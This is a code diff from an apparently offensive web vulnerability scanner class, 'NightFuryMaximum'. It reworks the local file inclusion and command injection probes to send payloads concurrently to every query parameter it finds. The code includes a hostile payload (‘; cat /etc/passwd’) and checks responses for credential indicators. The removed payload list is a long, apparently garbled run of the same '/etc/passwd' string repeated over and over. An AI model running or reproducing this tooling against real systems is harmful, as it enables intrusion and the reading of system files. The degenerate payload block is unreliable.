-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd",
-            "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd", "/etc/passwd"
         ]
         
         indicators = [
@@ -1542,39 +1114,36 @@ class NightFuryMaximum:
             ("password", "Credentials")
         ]
         
+        test_tasks = []
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
-            
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
-                
-                for param in params:
-                    for payload in payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        result = self.request(test_url)
-                        if not result['success']:
-                            continue
-                        
-                        content = result['response']['text']
-                        
-                        for indicator, desc in indicators:
-                            if indicator in content:
-                                results.append({
-                                    'type': 'Local File Inclusion',
-                                    'url': test_url,
-                                    'param': param,
-                                    'payload': payload,
-                                    'evidence': desc
-                                })
-                                print(f"    {Fore.RED}⚠ Found: {param} LFI ({desc}){Fore.RESET}")
-                                break
-            except:
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
+            for param in params:
+                for payload in payloads:
+                    test_params = params.copy()
+                    test_params[param] = [payload]
+                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
+                    test_tasks.append((test_url, param, payload))
+        
+        url_results = self._concurrent_request([t[0] for t in test_tasks])
+        for test_url, param, payload in test_tasks:
+            result = url_results.get(test_url)
+            if not result or not result['success']:
                 continue
+            content = result['response']['text']
+            for indicator, desc in indicators:
+                if indicator in content:
+                    results.append({
+                        'type': 'Local File Inclusion',
+                        'url': test_url,
+                        'param': param,
+                        'payload': payload,
+                        'evidence': desc
+                    })
+                    print(f"    {Fore.RED}⚠ Found: {param} LFI ({desc}){Fore.RESET}")
+                    break
         
         return results
     
@@ -1613,65 +1182,58 @@ class NightFuryMaximum:
             ("; cat /etc/passwd", "root:x:")
         ]
         
+        time_tasks = []
+        output_tasks = []
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
             
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
+            # Baseline for time-based
+            bl = self.request(endpoint)
+            baseline = bl['response']['elapsed'] if bl['success'] else 0.3
+            
+            for param in params:
+                for payload, threshold in time_payloads:
+                    tp = params.copy()
+                    tp[param] = [payload]
+                    u = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
+                    time_tasks.append((u, param, payload, threshold))
                 
-                # Baseline
-                start = time.time()
-                self.request(endpoint)
-                baseline = time.time() - start
-                
-                for param in params:
-                    # Time-based
-                    for payload, threshold in time_payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        start = time.time()
-                        self.request(test_url, timeout=threshold+5)
-                        elapsed = time.time() - start
-                        
-                        if elapsed > baseline + threshold:
-                            results.append({
-                                'type': 'Command Injection (Time Based)',
-                                'url': test_url,
-                                'param': param,
-                                'payload': payload,
-                                'delay': f"{elapsed:.2f}s"
-                            })
-                            print(f"    {Fore.RED}⚠ Found: {param} time-based cmd injection{Fore.RESET}")
-                            break
-                    
-                    # Output-based
-                    for payload, *indicators in output_payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        result = self.request(test_url)
-                        if not result['success']:
-                            continue
-                        
-                        content = result['response']['text'].lower()
-                        for indicator in indicators:
-                            if isinstance(indicator, str) and indicator.lower() in content:
-                                results.append({
-                                    'type': 'Command Injection',
-                                    'url': test_url,
-                                    'param': param,
-                                    'payload': payload,
-                                    'evidence': indicator
-                                })
-                                print(f"    {Fore.RED}⚠ Found: {param} cmd injection{Fore.RESET}")
-                                break
-            except:
+                for payload, *indicators in output_payloads:
+                    tp = params.copy()
+                    tp[param] = [payload]
+                    u = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
+                    output_tasks.append((u, param, payload, indicators))
+        
+        time_results = self._concurrent_request([t[0] for t in time_tasks])
+        for url, param, payload, threshold in time_tasks:
+            r = time_results.get(url)
+            if r and r['success'] and r['response']['elapsed'] > baseline + threshold:
+                results.append({
+                    'type': 'Command Injection (Time Based)',
+                    'url': url, 'param': param, 'payload': payload,
+                    'delay': f"{r['response']['elapsed']:.2f}s"
+                })
+                print(f"    {Fore.RED}⚠ Found: {param} time-based cmd injection{Fore.RESET}")
+                break
+        
+        out_results = self._concurrent_request([t[0] for t in output_tasks])
+        for url, param, payload, indicators in output_tasks:
+            r = out_results.get(url)
+            if not r or not r['success']:
                 continue
+            content = r['response']['text'].lower()
+            for ind in indicators:
+                if isinstance(ind, str) and ind.lower() in content:
+                    results.append({
+                        'type': 'Command Injection',
+                        'url': url, 'param': param, 'payload': payload,
+                        'evidence': ind
+                    })
+                    print(f"    {Fore.RED}⚠ Found: {param} cmd injection{Fore.RESET}")
+                    break
         
         return results
     
